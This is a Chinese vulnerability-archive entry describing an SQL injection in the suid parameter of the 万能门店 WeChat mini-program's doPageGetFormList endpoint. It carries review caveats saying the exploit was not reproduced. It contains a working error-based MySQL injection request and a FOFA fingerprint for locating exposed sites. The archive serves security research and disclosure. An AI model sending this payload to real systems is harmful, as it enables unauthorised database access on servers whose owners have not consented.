---
source: "wy876 漏洞文库"
title: "万能门店小程序 doPageGetFormList suid SQL注入"
product: "万能门店小程序"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "版本未知；MySQL GTID函数"
prerequisites: "未携认证，鉴权待核"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/pg8al3o5uwx56x74"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E4%B8%87%E8%83%BD%E9%97%A8%E5%BA%97%E5%B0%8F%E7%A8%8B%E5%BA%8F/%E5%BE%AE%E4%BF%A1%E4%B8%87%E8%83%BD%E9%97%A8%E5%BA%97%E5%B0%8F%E7%A8%8B%E5%BA%8F%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
fofa_unverified: "<font style="
id: "vw-3d3f7ccd721a984aa8a16a06"
entity_id: "ve-3d3f7ccd721a984aa8a16a06"
schema_version: "1"
---

# 万能门店小程序 doPageGetFormList suid SQL注入

## 条目说明

- 对象与具体问题：万能门店小程序；doPageGetFormList suid SQL注入
- 版本、配置及部署条件：版本未知；MySQL GTID函数
- 认证与权限前提：未携认证，鉴权待核
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 只有version报错载荷，无响应/源码/补丁；不同于189/190 uniacid端点
- HTTP错标Java，Host空，产品介绍不可替代版本

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

## 一、漏洞简介
万能门店微信小程序不限制小程序生成数量，支持多页面，预约功能等。 本套源码包含多商户插件、点餐插件、拼团插件、积分兑换、小程序手机客服等全套十个插件模块。支持后台一键扫码上传小程序，和后台通用模板。微信万能门店小程序系统存在SQL注入漏洞

## 二、影响版本
+ 微信万能门店小程序系统

## 三、资产测绘
+ fofa`"/comhome/cases/index.html"`
+ 特征


## 四、漏洞复现
```http
POST /api/wxapps/doPageGetFormList HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
 
suid=' AND GTID_SUBSET(CONCAT((SELECT (VERSION()))),1)-- bdmV
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/pg8al3o5uwx56x74>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
